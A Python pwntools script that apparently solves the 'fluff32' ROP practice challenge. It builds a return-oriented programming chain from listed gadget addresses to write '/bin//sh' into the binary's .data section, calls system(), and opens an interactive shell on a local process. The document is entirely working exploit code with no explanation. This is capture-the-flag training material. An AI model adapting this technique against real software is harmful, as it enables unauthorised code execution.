from pwn import *

# [Sections] read and writeable
#Nm Paddr       Size Vaddr      Memsz Perms Name
#19 0x00000f08     4 0x08049f08     4 -rw- .init_array
#20 0x00000f0c     4 0x08049f0c     4 -rw- .fini_array
#21 0x00000f10     4 0x08049f10     4 -rw- .jcr
#22 0x00000f14   232 0x08049f14   232 -rw- .dynamic
#23 0x00000ffc     4 0x08049ffc     4 -rw- .got
#24 0x00001000    40 0x0804a000    40 -rw- .got.plt
#25 0x00001028     8 0x0804a028     8 -rw- .data
#26 0x00001030     0 0x0804a040    44 -rw- .bss
write_to = 0x0804a028

# 0x08048671 xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
xor_edx_edx = 0x08048671

# 0x08048716: pop ebx; ret
pop_ebx = 0x08048716

# 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
xor_edx_ebx = 0x0804867b

# 0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret
xchg_edx_ecx = 0x08048689

# 0x08048693: mov dword [ecx], edx; pop ebp; pop ebx; xor byte [ecx], bl; ret;
mov_edx_ecx_ptr = 0x08048693

# ebx -> edx: xor_edx_edx;pop_ebx;xor_edx_ebx
# edx -> ecx: xchg_edx_ecx

fluff32 = ELF('fluff32')

def load_address(address):
    # write_to -> ecx
    rop_chain = p32(xor_edx_edx)
    rop_chain += "\x00"*4
    rop_chain += p32(pop_ebx)
    rop_chain += p32(address)
    rop_chain += p32(xor_edx_ebx)
    rop_chain += "\x00"*4
    rop_chain += p32(xchg_edx_ecx)
    rop_chain += "\x00"*4
    return rop_chain

def load_string(string):
    # string -> edx
    rop_chain = p32(xor_edx_edx)
    rop_chain += "\x00"*4
    rop_chain += p32(pop_ebx)
    rop_chain += string
    rop_chain += p32(xor_edx_ebx)
    rop_chain += "\x00"*4
    return rop_chain

def write_data():
    # write to .data
    rop_chain = p32(mov_edx_ecx_ptr)
    rop_chain += "\x00"*4
    rop_chain += "\x00"*4
    return rop_chain

rop_chain = "Z"*44
# Prime registers
rop_chain += load_address(write_to)
rop_chain += load_string("/bin")
rop_chain += write_data()

rop_chain += load_address(write_to+4)
rop_chain += load_string("//sh")
rop_chain += write_data()

# 0x08048430    1 6            sym.imp.system
rop_chain += p32(0x08048430)
rop_chain += p32(write_to)
rop_chain += p32(write_to)


p = process(fluff32.path)
p.recvuntil('> ')
p.sendline(rop_chain)
p.interactive()
